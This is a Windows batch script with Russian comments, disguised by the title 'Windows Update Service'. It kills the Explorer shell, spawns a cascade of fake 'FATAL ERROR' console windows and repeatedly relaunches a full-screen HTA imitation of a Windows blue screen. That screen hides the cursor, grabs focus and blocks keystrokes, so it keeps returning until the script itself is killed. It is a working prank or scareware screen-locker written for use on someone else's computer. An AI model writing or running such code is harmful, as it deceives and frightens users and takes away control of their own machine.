@echo off
title Windows Update Service
setlocal enabledelayedexpansion

:: 1. Подготовка: Убираем лишнее и вырубаем Пуск
powershell -command "(New-Object -ComObject shell.application).minimizeall()"
taskkill /f /im explorer.exe >nul 2>&1

:: 2. Создаем ОЧЕНЬ РЕАЛИСТИЧНЫЙ BSOD (Синий экран)
set "BSOD=%temp%\system_error.hta"

echo ^<html^>^<head^>^<title^>Critical Error^</title^> > "%BSOD%"
echo ^<hta:application border="none" caption="no" contextmenu="no" innerborder="no" maximizebutton="no" minimizebutton="no" navigable="no" scroll="no" selection="no" showintaskbar="no" singleinstance="yes" sysmenu="no" windowstate="maximize" /^> >> "%BSOD%"
echo ^<style^> >> "%BSOD%"
echo   body { background-color: #0078D7; color: white; font-family: 'Segoe UI', Tahoma, sans-serif; cursor: none; margin: 100px; overflow: hidden; } >> "%BSOD%"
echo   .face { font-size: 120px; margin-bottom: 20px; } >> "%BSOD%"
echo   .main-text { font-size: 28px; width: 800px; line-height: 1.4; } >> "%BSOD%"
echo   .sub-text { font-size: 18px; margin-top: 40px; display: flex; align-items: center; } >> "%BSOD%"
echo   .qr { background: white; width: 100px; height: 100px; margin-right: 20px; color: black; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 10px; text-align: center; } >> "%BSOD%"
echo ^</style^> >> "%BSOD%"
echo ^<script^> >> "%BSOD%"
echo   window.focus^(^); >> "%BSOD%"
echo   setInterval^(function^(^){ window.focus^(^); }, 10^); >> "%BSOD%"
echo   document.onkeydown = function^(e^) { >> "%BSOD%"
echo     var ev = e ^|^| window.event; >> "%BSOD%"
echo     if ^(ev.keyCode == 27^) { window.close^(^); } // ESC работает только если убить батник >> "%BSOD%"
echo     return false; >> "%BSOD%"
echo   }; >> "%BSOD%"
echo ^</script^> >> "%BSOD%"
echo ^<body oncontextmenu="return false;"^> >> "%BSOD%"
echo   ^<div class="face"^>:(^</div^> >> "%BSOD%"
echo   ^<div class="main-text"^>Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.^</div^> >> "%BSOD%"
echo   ^<div class="main-text"^>^<span id="pct"^>0^</span^>%% complete^</div^> >> "%BSOD%"
echo   ^<div class="sub-text"^> >> "%BSOD%"
echo     ^<div class="qr"^>QR-CODE^<br^>PLACEHOLDER^</div^> >> "%BSOD%"
echo     ^<div^>For more information about this issue and possible fixes, visit https://www.windows.com/stopcode ^<br^>^<br^> >> "%BSOD%"
echo     If you call a support person, give them this info: ^<br^> Stop code: CRITICAL_PROCESS_DIED^</div^> >> "%BSOD%"
echo   ^</div^> >> "%BSOD%"
echo   ^<script^> >> "%BSOD%"
echo     var p = 0; function count^(^) { if^(p^<100^){ p++; document.getElementById^('pct'^).innerHTML = p; setTimeout^(count, 200^); } } count^(^); >> "%BSOD%"
echo   ^</script^> >> "%BSOD%"
echo ^</body^>^</html^> >> "%BSOD%"

:: 3. ЗАПУСК КАСКАДА ОКНОШЕК (Быстро и агрессивно)
echo Запуск диагностики...
for /l %%i in (1,1,12) do (
    start cmd.exe /c "@echo off & title SYSTEM_ERROR_%%i & color 4f & cls & echo. & echo   !!! FATAL ERROR !!! & echo   ADDRESS: 0x00000%%i & echo. & pause > nul"
    :: Очень короткая задержка для эффекта наслоения
    ping -n 1 -w 50 127.0.0.1 > nul
)

:: 4. ФИНАЛ: Синий экран
timeout /t 2 /nobreak > nul
:loop
mshta "%BSOD%"
if exist "%BSOD%" goto loop

:: 5. ОЖИВЛЕНИЕ (после закрытия консоли)
start explorer.exe
del "%BSOD%"
exit